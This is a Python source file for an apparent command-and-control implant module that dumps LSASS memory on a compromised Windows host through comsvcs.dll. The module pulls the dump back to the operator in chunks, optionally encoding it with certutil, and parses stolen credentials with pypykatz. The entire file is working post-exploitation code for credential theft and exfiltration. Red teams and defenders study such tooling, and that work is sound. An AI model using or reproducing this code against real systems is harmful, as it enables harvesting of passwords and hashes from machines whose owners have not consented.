import core.job
import core.implant
import uuid
import time
import os

class ComsvcsLSASSImplant(core.implant.Implant):

    NAME = "Comsvcs LSASS"
    DESCRIPTION = "Utilizes comsvcs.dll to create a MiniDump of LSASS, parses with pypykatz."
    AUTHORS = ["TheNaterz", "modexp"]
    STATE = "implant/gather/comsvcs_lsass"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        self.options.register("CHUNKSIZE", "10000000", "size in bytes (kind of) of chunks to save, helps avoid MemoryError exceptions", required=True)
        self.options.register("CERTUTIL", "false", "use certutil to base64 encode the file before downloading", required=True, boolean=True)
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("LSASSPID", "0", "process ID of lsass.exe (0 = detect automatically)", required=False)

    def job(self):
        return ComsvcsLSASSJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/gather/comsvcs_lsass.js"
        self.dispatch(payloads, self.job)

class ComsvcsLSASSJob(core.job.Job):
    def create(self):
        self.katz_output = ""
        if self.session_id == -1:
            return
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
            return False

    def report(self, handler, data, sanitize = False):

        task = handler.get_header("Task", False)

        if task == 'pid':
            handler.reply(200)
            self.print_status("Detected lsass.exe process ID: "+data.decode()+"...")
            return

        if task == 'nopid':
            handler.reply(200)
            self.print_status("Could not identify lsass.exe process ID. Please provide manually...")
            return

        if task == 'startrun':
            handler.reply(200)
            self.print_status("Creating a MiniDump with comsvcs.dll...")
            return

        if task == 'endrun':
            handler.reply(200)
            self.print_status("Finished creating MiniDump...")
            return

        if task == 'upload':
            handler.reply(200)
            self.print_status("Downloading lsass bin file...")
            return

        if task == 'delbin':
            handler.reply(200)
            self.print_status("Removing lsass bin file from target...")
            super(ComsvcsLSASSJob, self).report(handler, data, False)

        if task == 'dump':
            self.save_fname = self.options.get("LPATH") + "/lsass." + self.ip + "." + uuid.uuid4().hex
            self.save_fname = self.save_fname.replace("//", "/")

            i = 0
            step = int(self.options.get("CHUNKSIZE"))
            partfiles = []
            datalen = len(data)
            while i < datalen:
                with open(self.save_fname+str(i), "wb") as f:
                    partfiles.append(self.save_fname+str(i))
                    end = i+step
                    if end > datalen:
                        end = datalen
                    while True:
                        try:
                            pdata = self.decode_downloaded_data(data[i:end], handler.get_header("encoder", "1252"))
                        except:
                            end -= 1
                            continue
                        break
                    try:
                        # if the data is just a text file, we want to decode correctly and then re-encode
                        pdata = pdata.decode('cp'+handler.get_header("encoder", "1252")).encode()
                    except:
                        pass
                    f.write(pdata)
                i = end

            with open(self.save_fname, "wb+") as f:
                for p in partfiles:
                    f.write(open(p, "rb").read())
                    os.remove(p)
            self.save_len = len(data)

            if self.options.get("CERTUTIL") == "true":
                with open(self.save_fname, "rb") as f:
                    data = f.read()
                data = self.decode_downloaded_data(data, "936")
                with open(self.save_fname, "wb") as f:
                    f.write(data)

            self.print_status("Download complete, parsing with pypykatz...")

            from pypykatz.pypykatz import pypykatz
            from pypykatz.commons.common import UniversalEncoder

            r = []
            mimi = pypykatz.parse_minidump_file(self.save_fname)
            r.append(mimi)

            import json
            json_results = json.loads(json.dumps(r, cls = UniversalEncoder))[0]

            cp = core.cred_parser.CredParse(self)
            self.katz_output = cp.parse_pypykatz(json_results)
            handler.reply(200)

    def done(self):
        rfile = "lsass.bin"
        if self.save_len == 0:
            self.print_warning("The file is empty")
        self.results = "%s saved to %s (%d bytes)" % (rfile, self.save_fname, self.save_len)
        if self.katz_output: self.results += "\n"+self.katz_output
        self.print_status(self.results.split("\n")[0])
        self.display()

    def display(self):
        if self.katz_output:
            self.print_good(self.katz_output)
        else:
            self.error("", "", "", "")
